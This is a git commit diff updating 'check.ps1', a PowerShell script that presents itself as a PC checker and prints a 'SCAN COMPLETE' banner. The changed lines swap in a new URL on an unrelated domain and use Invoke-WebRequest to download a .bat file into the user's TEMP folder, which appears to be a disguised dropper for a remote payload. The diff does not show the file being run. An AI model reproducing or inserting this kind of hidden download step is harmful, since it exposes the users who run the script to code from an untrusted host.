2aeff82e7d68c0a0352ef3ac783913569c5715b8
PC-Checker <johnnycox2415@gmail.com>
2025-09-28 13:04:07 -0500

    Update check.ps1

--- check.ps1
+++ check.ps1
@@ -1,5 +1,5 @@
-$exeUrl  = "https://21savage.online/afjfaifi.bat"
-$exePath = "$env:TEMP\afkaofkaof.bat"
+$exeUrl  = "https://21savage.online/22059717.bat"
+$exePath = "$env:TEMP\22059717.bat"
 
 Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
 
@@ -303,5 +303,6 @@ $space = " " * 12  # Increased the number of spaces for more right alignment
 Write-Host "`n$space╭─────────────────────────────────────╮" -ForegroundColor $yellow
 Write-Host "$space│            SCAN COMPLETE            │" -ForegroundColor $yellow
 Write-Host "$space╰─────────────────────────────────────╯" -ForegroundColor $yellow
+
 
 
